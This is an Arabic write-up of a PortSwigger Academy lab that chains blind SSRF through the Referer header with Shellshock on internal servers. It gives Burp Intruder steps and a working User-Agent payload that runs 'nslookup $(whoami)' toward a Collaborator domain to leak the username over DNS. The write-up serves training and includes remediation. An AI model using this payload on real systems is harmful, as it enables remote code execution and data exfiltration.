# Lab 07 — Blind SSRF with Shellshock Exploitation (دمج SSRF الأعمى مع ثغرة Shellshock لـ RCE)

[![التصنيف](https://img.shields.io/badge/الفئة-SSRF-red)]()
[![النوع](https://img.shields.io/badge/النوع-Blind%20SSRF%20Chained%20to%20Remote%20Code%20Execution-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/ssrf)

> هذا الشرح جزء من سلسلة [معامل تزوير الطلبات (SSRF)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 07 — Blind SSRF with Shellshock Exploitation (دمج SSRF الأعمى مع ثغرة Shellshock لـ RCE) |
| **تصنيف الثغرة** | Blind SSRF Chained to Remote Code Execution |
| **معيار الضعف (CWE)** | CWE-918 (chained with CWE-78 — CVE-2014-6271) |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | استغلال SSRF أعمى في هيدر Referer لمسح الشبكة الداخلية واستهداف خادم مصاب بثغرة Shellshock وسحب اسم المستخدم عبر DNS. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

هذا اللاب هو قمة سيناريوهات الهجمات الواقعية المتقدمة، حيث يتم دمج 3 ثغرات معاً:
1. ثغرة **Blind SSRF** عبر هيدر `Referer`: السيرفر يقوم بزيارة أي رابط يوضع في Referer، ويقوم بتمرير ترويسة `User-Agent` الخاصة بالمتصفح كما هي إلى الخادم المستهدف!
2. وجود خوادم داخلية قديمة في الشبكة الخاصة `192.168.0.X:8080` مصابة بثغرة **Shellshock (CVE-2014-6271)** الشهيرة في مفسر Bash.
3. استخراج البيانات أعمى عبر **DNS Data Exfiltration**:
نضع في هيدر `User-Agent` بيلود شيلشوك:
`User-Agent: () { :; }; /usr/bin/nslookup $(whoami).<collab-id>`
ونرسل هيدر `Referer` موجه نحو أجهزة الشبكة الداخلية عبر Burp Intruder من 1 إلى 254.
عندما يصل الطلب للخادم المصاب بشيلشوك، يقوم بتنفيذ أمر `nslookup` ويستخرج اسم المستخدم عبر الـ DNS إلى Collaborator!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يستغل خادم الويب كجسر لعبور الجدار الناري وتنفيذ كود خبيث عبر Shellshock داخل أجهزة الشبكة الداخلية المعزولة.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
إهمال تحديث وتأمين الخوادم الداخلية بظن أنها معزولة، مع وجود ثغرة SSRF في السيرفر الخارجي المواجه للإنترنت.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. في Burp Suite، انسخ نطاق Collaborator فريد (مثال: `xyz.oastify.com`).
2. التقط طلب زيارة أي منتج في المتجر وأرسله إلى **Intruder**.
3. في ترويسة `User-Agent`، احقن بيلود ثغرة Shellshock مع دمج أمر `whoami` في استعلام Collaborator:
`User-Agent: () { :; }; /usr/bin/nslookup $(whoami).xyz.oastify.com`.
4. في ترويسة `Referer`، استهدف أجهزة الشبكة الداخلية مع وضع علامة Payload على الرقم الأخير:
`Referer: http://192.168.0.§1§:8080`.
5. في تبويب **Payloads**:
- Type: **Numbers** (From 1 to 255, step 1).
- ابدأ الهجوم بالضغط على **Start attack**.
6. أثناء عمل الهجوم، افتح تبويب **Collaborator** واضغط **Poll now** باستمرار.
7. ستلاحظ استلام استعلام DNS يحتوي على اسم المستخدم الحقيقي (مثال: `user-abcde.xyz.oastify.com`).
8. انسخ اسم المستخدم واضغط **Submit solution** لإنهاء اللاب بنجاح!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
GET /product?productId=1 HTTP/1.1
Host: <lab-id>.web-security-academy.net
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).xyz.oastify.com
Referer: http://192.168.0.155:8080
Cookie: session=...
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

السيطرة الكاملة وتنفيذ الأوامر (RCE) على خوادم الشبكة الداخلية الحساسة وتدمير البنية التحتية.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

1. ترقيع ثغرة Shellshock بتحديث حزمة `bash` في كافة الخوادم الداخلية.
2. إغلاق ثغرة SSRF بمنع السيرفر من زيارة روابط ترويسات الـ Referer.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP Top 10 — A10:2021 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
